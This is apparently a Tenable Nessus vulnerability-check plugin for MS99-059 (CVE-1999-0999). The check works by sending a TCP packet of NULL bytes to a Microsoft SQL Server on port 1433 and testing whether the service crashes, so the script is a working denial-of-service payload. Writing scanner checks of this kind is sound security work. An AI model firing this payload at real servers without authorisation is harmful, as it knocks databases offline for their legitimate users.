#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10145);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-1999-0999");
 script_bugtraq_id(817);

 script_name(english:"MS99-059: Microsoft SQL Server Crafted TCP Packet Remote DoS (uncredentialed check)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote database server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote Microsoft SQL server can be shut down when it is
sent a TCP packet containing more than 2 NULLs.

An attacker may use this problem to prevent it from being used by 
legitimate clients, thus threatening your business." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms99-059" );
 script_set_attribute(attribute:"see_also", value:"http://support.microsoft.com/default.aspx?scid=kb;[LN];Q248749" );
 script_set_attribute(attribute:"solution", value:
"Apply the bulletin referenced above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/12/20");
 script_cvs_date("$Date: 2014/07/11 21:44:07 $");
 script_osvdb_id(1143);
 script_xref(name:"MSFT", value: "MS99-059");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:sql_server");
 script_end_attributes();

 
 summary["english"] = "Microsoft's SQL TCP/IP DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_require_ports("Services/mssql", 1433);
 script_dependencie("mssqlserver_detect.nasl");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"mssql", default:1433, exit_on_fail:TRUE);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Can't open socket on port "+port+".");

  data = raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
  send(socket:soc, data:data);
  close(soc);
  sleep(2);

if (service_is_dead(port:port) > 0)
  security_warning(port);
